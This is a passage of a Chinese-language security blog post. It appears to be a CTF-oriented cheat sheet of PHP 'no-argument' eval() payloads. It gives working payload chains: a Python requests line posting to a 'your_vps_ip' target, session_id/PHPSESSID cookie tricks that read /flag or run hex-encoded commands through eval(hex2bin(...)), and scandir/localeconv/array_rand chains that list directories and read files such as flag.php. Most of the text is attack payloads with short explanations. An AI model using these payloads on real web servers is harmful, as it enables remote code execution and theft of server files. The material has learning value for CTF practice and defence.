</span></span><span style="display:flex;"><span><span style="color:#58a1dd">r</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">post</span>(<span style="color:#a6be9d">&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;</span>, <span style="color:#58a1dd">files</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">files</span>)
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">r</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">content</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">decode</span>(<span style="color:#a6be9d">&#34;utf-8&#34;</span>, <span style="color:#a6be9d">&#34;ignore&#34;</span>))</span></span></code></pre></div><h1 id="session" class="heading-element"><span>session</span>
  <a href="#session" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>适用于：php7以下的版本
● <strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()
● <strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</p>
<h2 id="poc1-2" class="heading-element"><span>POC1</span>
  <a href="#poc1-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>● show_source(session_id(session_start()));
● var_dump(file_get_contents(session_id(session_start())))
● highlight_file(session_id(session_start()));
● readfile(session_id(session_start()));
抓包传入Cookie: PHPSESSID=(想读的文件)即可</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#58a1dd">GET</span> <span style="color:#58a1dd">/1.php?code=show_source(session_id(session_start()));</span> <span style="color:#ff636f">HTTP</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Cookie</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">PHPSESSID=/flag</span></span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242383.webp" alt="1645616832585" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242383.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242383.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242383.webp?size=large 2x" data-title="1645616832585" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="poc2-2" class="heading-element"><span>POC2</span>
  <a href="#poc2-2" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>**hex2bin()**函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用hex2bin()即可</p>
<p>先传入eval(hex2bin(session_id(session_start())));，然后抓包传入Cookie: PHPSESSID=(&ldquo;system(&lsquo;命令&rsquo;)&ldquo;的十六进制)即可</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#58a1dd">GET</span> <span style="color:#58a1dd">/1.php?code=eval(hex2bin(session_id(session_start())));</span> <span style="color:#ff636f">HTTP</span><span style="color:#ff636f">/</span><span style="color:#a6be9d">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Cookie</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">PHPSESSID=706870696e666f28293b</span></span></span></code></pre></div><h1 id="读目录" class="heading-element"><span>读目录</span>
  <a href="#%e8%af%bb%e7%9b%ae%e5%bd%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="查看当前目录文件名" class="heading-element"><span>查看当前目录文件名</span>
  <a href="#%e6%9f%a5%e7%9c%8b%e5%bd%93%e5%89%8d%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6%e5%90%8d" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">print_r</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">localeconv</span>())));</span></span></code></pre></div><h3 id="读取当前目录文件" class="heading-element"><span>读取当前目录文件</span>
  <a href="#%e8%af%bb%e5%8f%96%e5%bd%93%e5%89%8d%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">当前目录倒数第一位文件：</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">end</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>())));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">array_reverse</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>()))));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">当前目录倒数第二位文件：</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">next</span>(<span style="color:#58a1dd">array_reverse</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>()))));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">随机返回当前目录文件：</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">array_rand</span>(<span style="color:#58a1dd">array_flip</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>()))));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">array_rand</span>(<span style="color:#58a1dd">array_flip</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>()))));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">array_rand</span>(<span style="color:#58a1dd">array_flip</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">current</span>(<span style="color:#58a1dd">localeconv</span>())))));</span></span></code></pre></div><h3 id="查看上一级目录文件名" class="heading-element"><span>查看上一级目录文件名</span>
  <a href="#%e6%9f%a5%e7%9c%8b%e4%b8%8a%e4%b8%80%e7%ba%a7%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6%e5%90%8d" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">print_r</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">dirname</span>(<span style="color:#58a1dd">getcwd</span>())));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print_r</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">next</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>()))));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print_r</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">next</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>()))));</span></span></code></pre></div><h3 id="读取上级目录文件" class="heading-element"><span>读取上级目录文件</span>
  <a href="#%e8%af%bb%e5%8f%96%e4%b8%8a%e7%ba%a7%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">array_rand</span>(<span style="color:#58a1dd">array_flip</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">dirname</span>(<span style="color:#58a1dd">chdir</span>(<span style="color:#58a1dd">dirname</span>(<span style="color:#58a1dd">getcwd</span>())))))));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">array_rand</span>(<span style="color:#58a1dd">array_flip</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">hebrevc</span>(<span style="color:#58a1dd">crypt</span>(<span style="color:#58a1dd">chdir</span>(<span style="color:#58a1dd">next</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">getcwd</span>())))))))))));
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">show_source</span>(<span style="color:#58a1dd">array_rand</span>(<span style="color:#58a1dd">array_flip</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">hebrevc</span>(<span style="color:#58a1dd">crypt</span>(<span style="color:#58a1dd">chdir</span>(<span style="color:#58a1dd">next</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">hebrevc</span>(<span style="color:#58a1dd">crypt</span>(<span style="color:#58a1dd">phpversion</span>())))))))))))))));</span></span></code></pre></div><p>payload解释：
● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。
● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。
● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名
● dirname(chdir(dirname()))配合切换文件路径</p>
<h3 id="查看和读取根目录文件" class="heading-element"><span>查看和读取根目录文件</span>
  <a href="#%e6%9f%a5%e7%9c%8b%e5%92%8c%e8%af%bb%e5%8f%96%e6%a0%b9%e7%9b%ae%e5%bd%95%e6%96%87%e4%bb%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>所获得的字符串第一位有几率是/，需要多试几次</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">print_r</span>(<span style="color:#58a1dd">scandir</span>(<span style="color:#58a1dd">chr</span>(<span style="color:#58a1dd">ord</span>(<span style="color:#58a1dd">strrev</span>(<span style="color:#58a1dd">crypt</span>(<span style="color:#58a1dd">serialize</span>(<span style="color:#ff636f">array</span>())))))));</span></span></code></pre></div><h2 id="解释" class="heading-element"><span>解释</span>
  <a href="#%e8%a7%a3%e9%87%8a" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>localeconv()函数返回的是一个数组，其中第一个元素是一个‘ . ’，呢就可以进行一些操作，比如scandir(.)查看当前目录文件，那么他是要配合current()函数的（current()函数返回当前数组的第一个单元）如图示：</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242248.webp" alt="1645614850054" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242248.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242248.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242248.webp?size=large 2x" data-title="1645614850054" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>那么可能会读出：</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242364.webp" alt="1645615067337" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242364.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242364.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242364.webp?size=large 2x" data-title="1645615067337" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>然后就是想办法去读取flag.php</p>
<p>readfile(array_rand(arrar_flip(scandir(current(localeconv())))));</p>
<p>highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242368.webp" alt="1645615142517" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242368.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242368.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242368.webp?size=large 2x" data-title="1645615142517" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>1&raquo;利用array_flip()函数，作用是调换数组的键和值，那么flag.php就会变成键，然后用array_rand()函数随机返回键名（刷新  抽奖），然后用readfile()函数读取文件</p>
<p>2&raquo;&gt; array_reverse() 函数返回翻转顺序的数组 ，next()返回迭代器的下一项，highlight()让选中的文件语法高亮</p>
<p>测试如下：</p>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242366.webp" alt="1645616587663" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242366.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242366.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242366.webp?size=large 2x" data-title="1645616587663" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-tag" title="Tags - 命令执行">命令执行</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/48/" class="post-nav-item" rel="prev" title="权限提升"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>权限提升</a>
      <a href="/posts/owasp/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/111/" class="post-nav-item" rel="next" title="文件包含-常用目录">文件包含-常用目录<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
